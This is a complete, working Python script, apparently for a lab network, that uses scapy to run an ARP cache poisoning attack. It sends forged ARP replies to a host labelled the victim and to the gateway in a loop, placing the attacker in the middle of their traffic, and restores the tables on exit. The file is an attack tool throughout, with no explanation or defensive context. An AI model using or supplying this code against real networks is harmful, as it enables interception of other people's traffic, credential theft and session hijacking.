import scapy.all as scapy
import time
import sys

# Define your network configuration
target_ip = "192.168.64.3"  # Victim's IP
gateway_ip = "192.168.64.1"  # Gateway's IP

def get_mac(ip):
    """
    Get the MAC address for a given IP
    """
    try:
        answered = scapy.srp(
            scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip),
            timeout=2,
            verbose=False
        )[0]
        return answered[0][1].hwsrc
    except IndexError:
        print(f"[!] Could not resolve MAC for IP: {ip}")
        sys.exit(1)

def spoofer(target_ip, spoof_ip, target_mac):
    """
    Send spoofed ARP responses to poison the target's ARP cache
    """
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    Restore ARP table entries to their original state
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# Resolve MAC addresses
print("[*] Resolving MAC addresses...")
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)
print(f"Target MAC: {target_mac}")
print(f"Gateway MAC: {gateway_mac}")

# Start ARP poisoning
packets = 0
try:
    print("[*] Starting ARP poisoning. Press CTRL+C to stop...")
    while True:
        spoofer(target_ip, gateway_ip, target_mac)  # Spoof the victim (target thinks attacker is the gateway)
        spoofer(gateway_ip, target_ip, gateway_mac)  # Spoof the gateway (gateway thinks attacker is the victim)
        packets += 2
        print(f"\r[+] Packets sent: {packets}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Interrupted. Restoring network...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[*] Network restored. Exiting...")